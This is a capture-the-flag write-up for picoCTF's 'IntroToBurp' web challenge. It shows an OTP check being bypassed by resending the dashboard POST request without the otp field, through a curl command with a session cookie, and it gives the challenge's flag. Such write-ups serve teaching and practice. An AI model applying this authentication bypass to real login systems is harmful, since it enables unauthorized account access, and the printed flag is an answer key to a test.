# IntroToBurp:Web Exploitation:100pts
Try [here](http://titan.picoctf.net:58326/) to find the flag  

Hints  
1  
Try using burpsuite to intercept request to capture the flag.  
2  
Try mangling the request, maybe their server-side code doesn't handle malformed requests very well.  

# Solution
The URL is passed.  
When I accessed it, it was a Registration form.  
![site1.png](site/site1.png)  
When you enter and submit, you will be asked for an OTP.  
![site2.png](site/site2.png)  
`1`If you enter it appropriately and send it,`http://titan.picoctf.net:58326/dashboard`POST to 'otp=1'.  
For the time being, I thought of erasing it and POST.  
```bash
$ curl -X POST http://titan.picoctf.net:58326/dashboard -H 'Cookie: session=.eJwtzMsOwiAQBdBfMaxdQBGw_obdk-EVsS00PGIa4787mi7nzL33TWxsO7mRKc97Jmdiawm65dknROkYN8qAsaOSjPIRBDNwlV6pQDkXzDlnKVywF_qy6ASrx9odcCCeptqfEV-5bYiCDVIOeG5Q6ysXh1b_wZ89cvI69dX4gk6RevXl2Dtiny8s1DZQ.Zfm_sQ.rG5nVfmHj-E4HkfVggyivtGpuV0'
Welcome, satoki you sucessfully bypassed the OTP request.
Your Flag: picoCTF{#0TP_Bypvss_SuCc3$S_e1eb16ed}
```
flag was obtained (I feel a Guess CTF that I saw somewhere). 

## picoCTF{#0TP_Bypvss_SuCc3$S_e1eb16ed}